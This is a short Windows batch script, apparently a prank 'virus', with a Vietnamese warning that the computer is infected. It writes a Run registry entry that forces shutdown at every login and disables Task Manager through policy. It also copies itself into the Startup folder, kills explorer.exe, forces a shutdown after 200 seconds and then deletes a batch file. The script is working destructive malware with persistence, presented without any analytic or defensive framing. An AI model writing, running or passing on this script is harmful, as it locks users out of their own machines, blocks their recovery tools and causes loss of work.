
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v shutdown /t REG_SZ /d "shutdown.exe -f -s -t 200" /f
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskmgr /t REG_DWORD /d 1 /f
cls
copy thelove.bat "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\"
cls
taskkill /f /im explorer.exe
cls
shutdown.exe -f -s -t 200 -c "your computer will turn off after 200s ..."
cls
@echo off
echo Warning!!!!!!!!May Tinh Cua Ban Da Bi Nhiem Virus Bat Diet !!!!!!!!!
echo GOOD BYE 
pause
del Mr.Boss.bat
